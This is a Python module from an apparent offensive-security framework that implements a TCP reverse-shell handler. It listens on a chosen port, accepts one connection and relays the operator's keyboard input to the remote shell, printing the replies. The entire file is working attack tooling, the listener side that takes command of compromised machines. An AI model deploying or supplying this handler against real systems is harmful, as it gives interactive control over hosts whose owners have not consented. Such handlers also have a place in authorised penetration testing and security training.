import sys
import select
import socket
from ghostops.common.utils import Logger
from ghostops.core.base_module import BaseModule


class HandlerReverseTcp(BaseModule):
    name = "HandlerReverseTcp"
    description = "TCP reverse shell handler."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "handler"
    os = ["generic"]
    arch = ["generic"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--host", required=True, help="Target host")
        parser.add_argument("--port", required=True, type=int, help="Target port")

    @staticmethod
    def run(args):
        host = args.host
        port = args.port

        Logger.log("info", f"Listening on {host}:{port}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(1)

            conn, addr = server.accept()
            with conn:
                Logger.log("good", f"Connection established from {addr[0]}:{addr[1]}")
                HandlerReverseTcp.interactive_shell(conn)

    @staticmethod
    def interactive_shell(conn):
        conn.setblocking(False)

        try:
            while True:
                ready_to_read, _, _ = select.select([conn, sys.stdin], [], [])

                for source in ready_to_read:
                    if source == conn:
                        data = conn.recv(4096)
                        if not data:
                            Logger.log("warn", "Connection closed by remote host.")
                            return

                        sys.stdout.write(data.decode(errors="ignore"))
                        sys.stdout.flush()

                    else:
                        user_input = sys.stdin.readline()
                        if not user_input:
                            Logger.log(
                                "info", "EOF received from stdin. Closing shell."
                            )
                            return

                        conn.sendall(user_input.encode())

        except KeyboardInterrupt:
            print(end="\r")
            Logger.log("warn", f"KeyboardInterrupt received from stdin. Closing shell.")
        except Exception as e:
            Logger.log("warn", f"Error in interactive shell: {e}")
